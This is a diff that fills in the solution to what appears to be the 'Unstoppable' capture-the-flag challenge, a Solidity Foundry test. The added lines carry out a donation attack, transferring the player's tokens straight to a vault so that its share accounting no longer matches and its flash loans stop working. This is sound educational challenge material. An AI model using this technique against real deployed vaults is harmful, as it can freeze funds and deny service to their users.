@@ -91,7 +91,11 @@ contract UnstoppableChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_unstoppable() public checkSolvedByPlayer {
-        
+        // internal accounting vs external accounting issue
+        // transfering some tokens to the vault (donation attack)
+        // so that totalAssets() != convertToShares(totalSupply)
+        token.approve(address(vault), INITIAL_PLAYER_TOKEN_BALANCE);
+        token.transfer(address(vault), INITIAL_PLAYER_TOKEN_BALANCE);        
     }
 
     /**
